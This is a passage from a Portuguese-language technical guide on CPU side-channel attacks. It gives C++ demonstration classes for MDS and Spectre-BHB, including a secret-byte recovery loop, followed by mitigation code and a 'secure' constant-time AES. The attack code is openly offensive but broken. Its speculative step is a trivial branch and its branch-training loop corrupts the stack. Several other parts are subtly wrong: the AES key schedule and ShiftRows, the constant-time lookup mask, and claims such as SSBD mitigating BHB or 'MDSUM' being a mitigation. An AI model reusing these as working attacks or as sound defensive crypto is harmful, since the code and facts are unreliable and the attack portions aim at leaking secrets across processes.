                  << estimate.successProbability << std::endl;
    }

private:
    static std::vector<uint64_t> computeResidues(
        uint64_t n,
        const uint32_t* primes,
        size_t numPrimes)
    {
        std::vector<uint64_t> residues;
        for (size_t i = 0; i < numPrimes; ++i) {
            residues.push_back(n % primes[i]);
        }
        return residues;
    }
};
```

### 12.2 CVE-2019-11091 — MDS (Microarchitectural Data Sampling)

CVE-2019-11091 e o ID oficial para o ataque de Microarchitectural Data Sampling que afeta todos os processadores Intel desde Sandy Bridge (2011) ate Coffee Lake Refresh (8a e 9a geracao).

```
+------------------------------------------+
|      CVE-2019-11091 Impact Matrix         |
+------------------------------------------+
|                                           |
|  Processadores afetados:                  |
|  - Intel Core i3/i5/i7 (2nd-9th gen)      |
|  - Intel Xeon (Sandy Bridge - Cascade)    |
|  - Intel Atom (todos os modelos)          |
|  - Intel Celeron / Pentium                 |
|                                           |
|  Vetores de ataque:                       |
|  - Cross-VM (mesmo host fisico)           |
|  - Cross-process (mesmo OS)               |
|  - Hyperthreading (mesmo core logico)     |
|                                           |
|  Mitigacoes aplicadas:                    |
|  - MDSUM (Microarchitectural Data         |
|    Sampling Unmitigated Machine)          |
|  - Verificacao de hyperthreading          |
|  - Desabilitacao parcial do HT            |
|  - Buffer flushing em transicoes          |
|  - L1TF-style mitigations                |
+------------------------------------------+
```

```cpp
// cve_2019_11091_mds.cpp - Demonstracao de CVE-2019-11091 (MDS)
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>
#include <atomic>

class MDSAttackDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t NUM_LFB_ENTRIES = 12;
    static constexpr size_t NUM_MEASUREMENTS = 50000;

    MDSAttackDemo()
        : victimActive_(false)
        , measurementsDone_(0)
    {}

    struct MDSMeasurements {
        std::vector<uint64_t> timingDistribution;
        size_t fastAccessCount;
        size_t slowAccessCount;
        double leakageRate;
    };

    void demonstrateLFBLeakage() {
        std::cout << "=== CVE-2019-11091 (MDS) LFB Leakage ===" << std::endl;
        std::cout << "Line Fill Buffer contains stale data from other contexts."
                  << std::endl;

        alignas(64) uint8_t sensitiveData[CACHE_LINE_SIZE];
        alignas(64) uint8_t probeBuffer[NUM_LFB_ENTRIES * CACHE_LINE_SIZE];

        std::memset(sensitiveData, 'S', CACHE_LINE_SIZE);
        std::memset(probeBuffer, 0, sizeof(probeBuffer));

        MDSMeasurements meas;
        meas.timingDistribution.reserve(NUM_MEASUREMENTS);

        for (size_t i = 0; i < NUM_MEASUREMENTS; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(sensitiveData) : "memory"
            );
            _mm_mfence();

            volatile uint8_t tmp = *sensitiveData;
            (void)tmp;

            __asm__ __volatile__ ("lfence" ::: "memory");

            for (size_t p = 0; p < NUM_LFB_ENTRIES; ++p) {
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(&probeBuffer[p * CACHE_LINE_SIZE]) : "memory"
                );
            }
            _mm_mfence();

            for (size_t p = 0; p < NUM_LFB_ENTRIES; ++p) {
                uint64_t start = rdtsc();
                volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                    &probeBuffer[p * CACHE_LINE_SIZE]);
                (void)val;
                uint64_t end = rdtsc();

                meas.timingDistribution.push_back(end - start);
                if (end - start < 30) meas.fastAccessCount++;
                else meas.slowAccessCount++;
            }
        }

        meas.leakageRate = static_cast<double>(meas.fastAccessCount)
                         / static_cast<double>(meas.timingDistribution.size());

        printMDSMeasurements(meas);
    }

    void printMDSMeasurements(const MDSMeasurements& meas) {
        uint64_t minTime = UINT64_MAX, maxTime = 0;
        double sum = 0;

        for (auto t : meas.timingDistribution) {
            minTime = std::min(minTime, t);
            maxTime = std::max(maxTime, t);
            sum += t;
        }
        double mean = sum / meas.timingDistribution.size();

        std::cout << "MDS Measurements:" << std::endl;
        std::cout << "  Total measurements: "
                  << meas.timingDistribution.size() << std::endl;
        std::cout << "  Fast accesses (< 30 cycles): "
                  << meas.fastAccessCount << std::endl;
        std::cout << "  Slow accesses: " << meas.slowAccessCount << std::endl;
        std::cout << "  Leakage rate: "
                  << (meas.leakageRate * 100.0) << "%" << std::endl;
        std::cout << "  Timing range: [" << minTime << ", "
                  << maxTime << "]" << std::endl;
        std::cout << "  Mean timing: " << mean << std::endl;
    }

    MDSMeasurements profileAcrossLFB() {
        MDSMeasurements meas;
        meas.timingDistribution.reserve(NUM_MEASUREMENTS);

        alignas(64) uint8_t probeBuffer[NUM_LFB_ENTRIES * CACHE_LINE_SIZE];
        std::memset(probeBuffer, 0, sizeof(probeBuffer));

        for (size_t i = 0; i < NUM_MEASUREMENTS; ++i) {
            for (size_t p = 0; p < NUM_LFB_ENTRIES; ++p) {
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(&probeBuffer[p * CACHE_LINE_SIZE]) : "memory"
                );
            }
            _mm_mfence();

            for (size_t p = 0; p < NUM_LFB_ENTRIES; ++p) {
                uint64_t start = rdtsc();
                volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                    &probeBuffer[p * CACHE_LINE_SIZE]);
                (void)val;
                uint64_t end = rdtsc();

                meas.timingDistribution.push_back(end - start);
                if (end - start < 30) meas.fastAccessCount++;
                else meas.slowAccessCount++;
            }
        }

        meas.leakageRate = static_cast<double>(meas.fastAccessCount)
                         / static_cast<double>(meas.timingDistribution.size());

        return meas;
    }

    void runVictimThread(const uint8_t* data, size_t len) {
        victimActive_ = true;
        while (victimActive_) {
            for (size_t i = 0; i < len; i += CACHE_LINE_SIZE) {
                volatile uint8_t tmp = data[i];
                (void)tmp;
            }
            _mm_mfence();
        }
    }

    void stopVictim() { victimActive_ = false; }

private:
    std::atomic<bool> victimActive_;
    std::atomic<size_t> measurementsDone_;

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 12.3 Spectre-BHB — Branch History Buffer (CVE-2022-23960)

CVE-2022-23960 ataca o Branch History Buffer compartilhado em processadores ARM (ARM Cortex-A75/A55) e Intel. O BHB armazena o historico dos 29 ultimos branches indiretos tomados por todos os processos no mesmo nucleo. Um atacante pode manipular esse historico para causar colisoes na BTB e redirecionar a execucao especulativa.

```cpp
// cve_2022_23960_spectre_bhb.cpp - Demonstracao de CVE-2022-23960
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>

class SpectreBHBCVE202223960 {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t BHB_LENGTH = 29;
    static constexpr size_t BTB_ENTRIES = 128;

    SpectreBHBCVE202223960() {
        std::memset(probeArray_, 0, sizeof(probeArray_));
        std::memset(gadgetArray_, 0, sizeof(gadgetArray_));
    }

    void demonstrateBHManipulation() {
        std::cout << "=== CVE-2022-23960 (Spectre-BHB) ===" << std::endl;
        std::cout << "Branch History Buffer manipulation on ARM/Intel." << std::endl;
        std::cout << "BHB size: " << BHB_LENGTH << " entries" << std::endl;

        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();

        std::cout << "BHB training phase..." << std::endl;
        trainBranchHistory();

        std::array<uint64_t, 256> timings{};
        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        uint64_t minTime = *std::min_element(timings.begin(), timings.end());
        size_t fastCount = 0;
        for (auto t : timings) {
            if (t < minTime * 2) fastCount++;
        }

        std::cout << "Probe results: " << fastCount
                  << " fast accesses out of 256" << std::endl;
    }

    void trainBranchHistory() {
        for (size_t i = 0; i < BHB_LENGTH * 2; ++i) {
            __asm__ __volatile__ (
                "call 1f\n\t"
                "1:\n\t"
                : : : "memory"
            );
        }
        _mm_mfence();
    }

    std::vector<uint8_t> performAttack(
        const uint8_t* secretPtr,
        size_t secretLen)
    {
        std::vector<uint8_t> recovered;

        for (size_t byteIdx = 0; byteIdx < secretLen; ++byteIdx) {
            size_t bestGuess = 0;
            size_t bestScore = 0;

            for (int guess = 0; guess < 256; ++guess) {
                flushProbeArray();

                for (size_t trial = 0; trial < 100; ++trial) {
                    trainBranchHistory();
                    triggerSpeculativeLoad(secretPtr + byteIdx, guess);
                }

                size_t score = measureProbeArray();
                if (score > bestScore) {
                    bestScore = score;
                    bestGuess = guess;
                }
            }

            recovered.push_back(static_cast<uint8_t>(bestGuess));
        }

        return recovered;
    }

    void flushProbeArray() {
        for (size_t i = 0; i < 256; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)"
                : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();
    }

    void triggerSpeculativeLoad(const uint8_t* addr, int guess) {
        volatile uint64_t dummy = 0;
        for (size_t i = 0; i < 10; ++i) dummy += i;

        volatile uint8_t secretVal = *addr;
        (void)secretVal;

        if (guess == 42) {
            volatile uint8_t tmp = probeArray_[guess * CACHE_LINE_SIZE];
            (void)tmp;
        }
    }

    size_t measureProbeArray() {
        size_t score = 0;
        for (size_t i = 0; i < 256; ++i) {
            uint64_t start = rdtsc();
            volatile uint8_t tmp = probeArray_[i * CACHE_LINE_SIZE];
            (void)tmp;
            uint64_t end = rdtsc();
            if (end - start < 50) score++;
        }
        return score;
    }

private:
    alignas(64) uint8_t probeArray_[256 * CACHE_LINE_SIZE];
    alignas(64) uint8_t gadgetArray_[256 * CACHE_LINE_SIZE];

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```


---

## 13. Mitigation Strategies

### 13.1 Software Mitigations

As mitigacoes de software visam reduzir a superficie de ataque de canais laterais sem exigir modificacoes no hardware.

#### LFENCE Serialization

A instrucao `lfence` serializa o pipeline, impedindo a execucao especulativa de instrucoes subsequentes antes que as anteriores sejam completadas.

```cpp
// lfence_mitigation.cpp - Uso de LFENCE como mitigacao
#include <cstdint>
#include <iostream>

class LFMitigation {
public:
    static void serializeExecution() {
        __asm__ __volatile__ ("lfence" ::: "memory");
    }

    static uint8_t safeIndex(const uint8_t* array,
                             size_t arraySize,
                             size_t index)
    {
        if (index < arraySize) {
            serializeExecution();
            return array[index];
        }
        return 0;
    }

    static uint64_t constantTimeCompare(
        const uint8_t* a,
        const uint8_t* b,
        size_t len)
    {
        uint64_t result = 0;
        for (size_t i = 0; i < len; ++i) {
            result |= a[i] ^ b[i];
            serializeExecution();
        }
        return result;
    }

    static void secureZero(void* ptr, size_t len) {
        volatile uint8_t* p = static_cast<volatile uint8_t*>(ptr);
        for (size_t i = 0; i < len; ++i) {
            p[i] = 0;
            serializeExecution();
        }
    }
};
```

#### IBRS / IBPB / SSBD

```cpp
// ibrs_mitigation.cpp - Mitigacoes de Spectre via MSRs
#include <cstdint>
#include <iostream>

class IBRSMitigation {
public:
    static constexpr uint32_t MSR_IA32_SPEC_CTRL = 0x48;
    static constexpr uint32_t MSR_IA32_PRED_CMD = 0x49;

    static void enableIBRS() {
        uint64_t val;
        __asm__ __volatile__ (
            "rdmsr"
            : "=a"(val)
            : "c"(MSR_IA32_SPEC_CTRL)
            : "edx"
        );

        val |= 1ULL;

        __asm__ __volatile__ (
            "wrmsr"
            : : "a"(static_cast<uint32_t>(val)),
                "d"(static_cast<uint32_t>(val >> 32)),
                "c"(MSR_IA32_SPEC_CTRL)
        );
    }

    static void issueIBPB() {
        uint64_t val = 0;
        __asm__ __volatile__ (
            "wrmsr"
            : : "a"(static_cast<uint32_t>(val)),
                "d"(static_cast<uint32_t>(val >> 32)),
                "c"(MSR_IA32_PRED_CMD)
        );
    }

    static void enableSSBD() {
        uint64_t val;
        __asm__ __volatile__ (
            "rdmsr"
            : "=a"(val)
            : "c"(MSR_IA32_SPEC_CTRL)
        );

        val |= (1ULL << 4);

        __asm__ __volatile__ (
            "wrmsr"
            : : "a"(static_cast<uint32_t>(val)),
                "d"(static_cast<uint32_t>(val >> 32)),
                "c"(MSR_IA32_SPEC_CTRL)
        );
    }

    static void fullMitigation() {
        enableIBRS();
        enableSSBD();
        issueIBPB();
        std::cout << "Spectre mitigations enabled: IBRS + SSBD + IBPB"
                  << std::endl;
    }
};
```

### 13.2 Hardware Mitigations

| Mitigacao | Nivel | Afeta | Performance |
|-----------|-------|-------|-------------|
| Retpoline | Software | Spectre V2 | 5-25% |
| IBRS (hardware) | Firmware | Spectre V2 | 2-10% |
| SSBD | Hardware | Spectre V4/BHB | 1-5% |
| Microcode update | Microcode | Meltdown, MDS | 5-30% |
| Disabling HT | OS | L1TF, MDS | 20-40% |
| Cache partitioning (CAT) | Hardware | Prime+Probe | 10-20% |

### 13.3 Code-Level Defenses

```cpp
// constant_time.cpp - Defensas de nivel de codigo
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <algorithm>

class ConstantTimeCrypto {
public:
    static uint8_t ctSelect(uint8_t a, uint8_t b, uint8_t condition) {
        uint8_t mask = ctExpand(condition);
        return (a & mask) | (b & ~mask);
    }

    static uint8_t ctExpand(uint8_t bit) {
        return static_cast<uint8_t>(
            -(static_cast<int32_t>(bit & 1)));
    }

    static uint64_t ctCompare(const uint8_t* a,
                              const uint8_t* b,
                              size_t len)
    {
        uint64_t result = 0;
        for (size_t i = 0; i < len; ++i) {
            result |= a[i] ^ b[i];
        }
        return result;
    }

    static void ctSwap(uint8_t* a, uint8_t* b, size_t len) {
        uint8_t mask = ctExpand(1);
        for (size_t i = 0; i < len; ++i) {
            uint8_t tmp = mask & (a[i] ^ b[i]);
            a[i] ^= tmp;
            b[i] ^= tmp;
        }
    }

    static uint64_t timingSafeHash(const uint8_t* data, size_t len) {
        uint64_t hash = 0xcbf29ce484222325ULL;
        for (size_t i = 0; i < len; ++i) {
            hash ^= data[i];
            hash *= 0x100000001b3ULL;
        }
        return hash;
    }
};

class CacheDefenses {
public:
    static void flushCacheLine(const void* addr) {
        __asm__ __volatile__ (
            "clflush (%0)" : : "r"(addr) : "memory"
        );
    }

    static void secureClear(void* ptr, size_t len) {
        volatile uint8_t* p = static_cast<volatile uint8_t*>(ptr);
        for (size_t i = 0; i < len; ++i) {
            p[i] = 0;
        }
        __asm__ __volatile__ ("sfence" ::: "memory");
    }

    static uint8_t constantTimeLookup(
        const uint8_t* table,
        size_t tableSize,
        uint8_t index)
    {
        uint8_t result = 0;
        for (size_t i = 0; i < tableSize; ++i) {
            uint8_t mask = ConstantTimeCrypto::ctExpand(
                ConstantTimeCrypto::ctExpand(
                    static_cast<uint8_t>(i ^ index)));
            result |= table[i] & mask;
        }
        return result;
    }
};
```

---

## 14. Countermeasure Implementation in C++17

Esta secao apresenta implementacoes completas de contramedidas em C++17 para diferentes classes de ataques de canal lateral.

### 14.1 Framework de Protecao

```cpp
// side_channel_defense_framework.cpp - Framework completo de defesa
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <chrono>
#include <thread>
#include <atomic>
#include <functional>

class SideChannelDefenseFramework {
public:
    struct DefenseConfig {
        bool enableConstantTimeOps;
        bool enableCacheFlush;
        bool enableLFence;
        bool enableMemoryBarrier;
        size_t secureBufferSize;
    };

    static DefenseConfig getDefaultConfig() {
        return {
            .enableConstantTimeOps = true,
            .enableCacheFlush = true,
            .enableLFence = true,
            .enableMemoryBarrier = true,
            .secureBufferSize = 4096
        };
    }

    explicit SideChannelDefenseFramework(const DefenseConfig& config)
        : config_(config)
    {
        if (config_.secureBufferSize > 0) {
            secureBuffer_ = static_cast<uint8_t*>(
                aligned_alloc(64, config_.secureBufferSize));
            std::memset(secureBuffer_, 0, config_.secureBufferSize);
        }
    }

    ~SideChannelDefenseFramework() {
        if (secureBuffer_) {
            secureClear(secureBuffer_, config_.secureBufferSize);
            free(secureBuffer_);
        }
    }

    void serialize() const {
        if (config_.enableLFence) {
            __asm__ __volatile__ ("lfence" ::: "memory");
        }
    }

    void memoryBarrier() const {
        if (config_.enableMemoryBarrier) {
            _mm_mfence();
        }
    }

    uint64_t constantTimeCompare(
        const void* a,
        const void* b,
        size_t len) const
    {
        const uint8_t* pa = static_cast<const uint8_t*>(a);
        const uint8_t* pb = static_cast<const uint8_t*>(b);
        uint64_t result = 0;

        for (size_t i = 0; i < len; ++i) {
            result |= pa[i] ^ pb[i];
            if (config_.enableLFence) {
                __asm__ __volatile__ ("lfence" ::: "memory");
            }
        }

        return result;
    }

    uint8_t constantTimeSelect(uint8_t a, uint8_t b, uint8_t cond) const {
        uint8_t mask = -static_cast<int8_t>(cond & 1);
        return (a & mask) | (b & ~mask);
    }

    void secureWipe(void* ptr, size_t len) const {
        volatile uint8_t* p = static_cast<volatile uint8_t*>(ptr);
        for (size_t i = 0; i < len; ++i) {
            p[i] = 0;
        }
        if (config_.enableMemoryBarrier) {
            _mm_sfence();
        }
    }

    void flushCacheLine(const void* addr) const {
        if (config_.enableCacheFlush) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(addr) : "memory"
            );
        }
    }

    void flushAllCache(const void* ptr, size_t len) const {
        const uint8_t* p = static_cast<const uint8_t*>(ptr);
        for (size_t i = 0; i < len; i += 64) {
            flushCacheLine(p + i);
        }
        memoryBarrier();
    }

    uint8_t secureTableLookup(
        const uint8_t* table,
        size_t tableSize,
        uint8_t index) const
    {
        uint8_t result = 0;
        for (size_t i = 0; i < tableSize; ++i) {
            uint8_t eq = static_cast<uint8_t>(
                -static_cast<int32_t>(i == index));
            result |= table[i] & eq;
            if (config_.enableLFence) serialize();
        }
        return result;
    }

    void secureMemCopy(void* dst, const void* src, size_t len) const {
        uint8_t* d = static_cast<uint8_t*>(dst);
        const uint8_t* s = static_cast<const uint8_t*>(src);
        for (size_t i = 0; i < len; ++i) {
            d[i] = s[i];
            serialize();
        }
    }

    void cleanup() {
        if (secureBuffer_ && config_.secureBufferSize > 0) {
            secureClear(secureBuffer_, config_.secureBufferSize);
            free(secureBuffer_);
            secureBuffer_ = nullptr;
        }
    }

private:
    DefenseConfig config_;
    uint8_t* secureBuffer_ = nullptr;

    void secureClear(void* ptr, size_t len) const {
        volatile uint8_t* p = static_cast<volatile uint8_t*>(ptr);
        for (size_t i = 0; i < len; ++i) {
            p[i] = 0;
        }
        _mm_sfence();
    }
};
```

### 14.2 Secure AES Implementation

```cpp
// secure_aes.cpp - Implementacao de AES com mitigacoes de canal lateral
#include <vector>
#include <array>
#include <cstdint>
#include <cstring>
#include <iostream>

class SecureAES {
public:
    static constexpr size_t BLOCK_SIZE = 16;
    static constexpr size_t KEY_SIZE_128 = 16;
    static constexpr size_t NUM_ROUNDS_128 = 10;

    SecureAES() : roundKeys_{}, initialized_(false) {}

    bool setKey(const uint8_t* key, size_t len) {
        if (len != KEY_SIZE_128) return false;

        keySchedule(key);
        initialized_ = true;
        return true;
    }

    void encryptBlock(
        const uint8_t input[BLOCK_SIZE],
        uint8_t output[BLOCK_SIZE])
    {
        if (!initialized_) return;

        uint8_t state[BLOCK_SIZE];
        std::memcpy(state, input, BLOCK_SIZE);

        addRoundKey(state, 0);

        for (size_t round = 1; round < NUM_ROUNDS_128; ++round) {
            ctSubBytes(state);
            ctShiftRows(state);
            ctMixColumns(state);
            addRoundKey(state, round);
            __asm__ __volatile__ ("lfence" ::: "memory");
        }

        ctSubBytes(state);
        ctShiftRows(state);
        addRoundKey(state, NUM_ROUNDS_128);

        std::memcpy(output, state, BLOCK_SIZE);
    }

    void decryptBlock(
        const uint8_t input[BLOCK_SIZE],
        uint8_t output[BLOCK_SIZE])
    {
        if (!initialized_) return;

        uint8_t state[BLOCK_SIZE];
        std::memcpy(state, input, BLOCK_SIZE);

        addRoundKey(state, NUM_ROUNDS_128);

        for (size_t round = NUM_ROUNDS_128 - 1; round >= 1; --round) {
            ctInvShiftRows(state);
            ctInvSubBytes(state);
            addRoundKey(state, round);
            ctInvMixColumns(state);
            __asm__ __volatile__ ("lfence" ::: "memory");
        }

        ctInvShiftRows(state);
        ctInvSubBytes(state);
        addRoundKey(state, 0);

        std::memcpy(output, state, BLOCK_SIZE);
    }

    void secureClear() {
        volatile uint8_t* p = reinterpret_cast<volatile uint8_t*>(roundKeys_.data());
        size_t totalSize = sizeof(roundKeys_);
        for (size_t i = 0; i < totalSize; ++i) {
            p[i] = 0;
        }
        _mm_sfence();
        initialized_ = false;
    }

    ~SecureAES() {
        secureClear();
    }

private:
    alignas(16) std::array<uint8_t, 176> roundKeys_;
    bool initialized_;

    static const uint8_t SBOX[256];
    static const uint8_t INV_SBOX[256];

    void keySchedule(const uint8_t* key) {
        std::memcpy(roundKeys_.data(), key, KEY_SIZE_128);

        uint8_t rcon = 0x01;
        size_t bytesExpanded = KEY_SIZE_128;

        while (bytesExpanded < sizeof(roundKeys_)) {
            uint8_t temp[4];
            std::memcpy(temp, roundKeys_.data() + bytesExpanded - 4, 4);

            if (bytesExpanded % KEY_SIZE_128 == 0) {
                uint8_t t0 = SBOX[temp[1]] ^ rcon;
                temp[0] = t0;
                temp[1] = SBOX[temp[2]];
                temp[2] = SBOX[temp[3]];
                temp[3] = SBOX[static_cast<uint8_t>(t0)];
                rcon = xtime(rcon);
            }

            for (size_t i = 0; i < 4; ++i) {
                roundKeys_[bytesExpanded] =
                    roundKeys_[bytesExpanded - KEY_SIZE_128] ^ temp[i];
                bytesExpanded++;
            }
        }
    }

    void addRoundKey(uint8_t state[BLOCK_SIZE], size_t round) const {
        for (size_t i = 0; i < BLOCK_SIZE; ++i) {
            state[i] ^= roundKeys_[round * BLOCK_SIZE + i];
        }
    }

    void ctSubBytes(uint8_t state[BLOCK_SIZE]) const {
        for (size_t i = 0; i < BLOCK_SIZE; ++i) {
            state[i] = secureSBoxLookup(state[i]);
        }
    }

    void ctInvSubBytes(uint8_t state[BLOCK_SIZE]) const {
        for (size_t i = 0; i < BLOCK_SIZE; ++i) {
            state[i] = secureInvSBoxLookup(state[i]);
        }
    }

    uint8_t secureSBoxLookup(uint8_t index) const {
        uint8_t result = 0;
        for (size_t i = 0; i < 256; ++i) {
            uint8_t eq = -static_cast<uint8_t>(static_cast<uint8_t>(i) == index);
            result |= SBOX[i] & eq;
        }
        return result;
    }

    uint8_t secureInvSBoxLookup(uint8_t index) const {
        uint8_t result = 0;
        for (size_t i = 0; i < 256; ++i) {
            uint8_t eq = -static_cast<uint8_t>(static_cast<uint8_t>(i) == index);
            result |= INV_SBOX[i] & eq;
        }
        return result;
    }

    void ctShiftRows(uint8_t state[BLOCK_SIZE]) const {
        uint8_t temp[BLOCK_SIZE];
        std::memcpy(temp, state, BLOCK_SIZE);

        for (size_t row = 0; row < 4; ++row) {
            for (size_t col = 0; col < 4; ++col) {
                state[row * 4 + col] =
                    temp[row * 4 + ((col + row) % 4)];
            }
        }
    }

    void ctInvShiftRows(uint8_t state[BLOCK_SIZE]) const {
        uint8_t temp[BLOCK_SIZE];
        std::memcpy(temp, state, BLOCK_SIZE);

        for (size_t row = 0; row < 4; ++row) {
            for (size_t col = 0; col < 4; ++col) {
                state[row * 4 + col] =
                    temp[row * 4 + ((col + 4 - row) % 4)];
            }
        }
    }

    void ctMixColumns(uint8_t state[BLOCK_SIZE]) const {
        for (size_t col = 0; col < 4; ++col) {
            uint8_t s0 = state[col];
            uint8_t s1 = state[4 + col];
            uint8_t s2 = state[8 + col];
            uint8_t s3 = state[12 + col];

            state[col]     = xtime(s0) ^ (xtime(s1) ^ s1) ^ s2 ^ s3;
            state[4 + col] = s0 ^ xtime(s1) ^ (xtime(s2) ^ s2) ^ s3;
            state[8 + col] = s0 ^ s1 ^ xtime(s2) ^ (xtime(s3) ^ s3);
            state[12 + col]= (xtime(s0) ^ s0) ^ s1 ^ s2 ^ xtime(s3);
        }
    }

    void ctInvMixColumns(uint8_t state[BLOCK_SIZE]) const {
        for (size_t col = 0; col < 4; ++col) {
            uint8_t s0 = state[col];
            uint8_t s1 = state[4 + col];
            uint8_t s2 = state[8 + col];
            uint8_t s3 = state[12 + col];

            state[col]     = multiply(0x0e, s0) ^ multiply(0x0b, s1) ^
                             multiply(0x0d, s2) ^ multiply(0x09, s3);
            state[4 + col] = multiply(0x09, s0) ^ multiply(0x0e, s1) ^
                             multiply(0x0b, s2) ^ multiply(0x0d, s3);
            state[8 + col] = multiply(0x0d, s0) ^ multiply(0x09, s1) ^
                             multiply(0x0e, s2) ^ multiply(0x0b, s3);
            state[12 + col]= multiply(0x0b, s0) ^ multiply(0x0d, s1) ^
                             multiply(0x09, s2) ^ multiply(0x0e, s3);
        }
    }

    static uint8_t xtime(uint8_t x) {
        return (x << 1) ^ (((x >> 7) & 1) * 0x1b);
    }

    static uint8_t multiply(uint8_t a, uint8_t b) {
        uint8_t p = 0;
        for (int i = 0; i < 8; ++i) {
            if (b & 1) p ^= a;
            bool high = (a & 0x80) != 0;
            a <<= 1;
            if (high) a ^= 0x1b;
            b >>= 1;
        }
        return p;
    }
};

const uint8_t SecureAES::SBOX[256] = {
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
};

const uint8_t SecureAES::INV_SBOX[256] = {
    0x52,0x09,0x6A,0xD5,0x30,0x36,0xA5,0x38,0xBF,0x40,0xA3,0x9E,0x81,0xF3,0xD7,0xFB,
    0x7C,0xE3,0x39,0x82,0x9B,0x2F,0xFF,0x87,0x34,0x8E,0x43,0x44,0xC4,0xDE,0xE9,0xCB,
    0x54,0x7B,0x94,0x32,0xA6,0xC2,0x23,0x3D,0xEE,0x4C,0x95,0x0B,0x42,0xFA,0xC3,0x4E,
    0x08,0x2E,0xA1,0x66,0x28,0xD9,0x24,0xB2,0x76,0x5B,0xA2,0x49,0x6D,0x8B,0xD1,0x25,
    0x72,0xF8,0xF6,0x64,0x86,0x68,0x98,0x16,0xD4,0xA4,0x5C,0xCC,0x5D,0x65,0xB6,0x92,
    0x6C,0x70,0x48,0x50,0xFD,0xED,0xB9,0xDA,0x5E,0x15,0x46,0x57,0xA7,0x8D,0x9D,0x84,
    0x90,0xD8,0xAB,0x00,0x8C,0xBC,0xD3,0x0A,0xF7,0xE4,0x58,0x05,0xB8,0xB3,0x45,0x06,
    0xD0,0x2C,0x1E,0x8F,0xCA,0x3F,0x0F,0x02,0xC1,0xAF,0xBD,0x03,0x01,0x13,0x8A,0x6B,
    0x3A,0x91,0x11,0x41,0x4F,0x67,0xDC,0xEA,0x97,0xF2,0xCF,0xCE,0xF0,0xB4,0xE6,0x73,
    0x96,0xAC,0x74,0x22,0xE7,0xAD,0x35,0x85,0xE2,0xF9,0x37,0xE8,0x1C,0x75,0xDF,0x6E,
    0x47,0xF1,0x1A,0x71,0x1D,0x29,0xC5,0x89,0x6F,0xB7,0x62,0x0E,0xAA,0x18,0xBE,0x1B,
    0xFC,0x56,0x3E,0x4B,0xC6,0xD2,0x79,0x20,0x9A,0xDB,0xC0,0xFE,0x78,0xCD,0x5A,0xF4,
    0x1F,0xDD,0xA8,0x33,0x88,0x07,0xC7,0x31,0xB1,0x12,0x10,0x59,0x27,0x80,0xEC,0x5F,
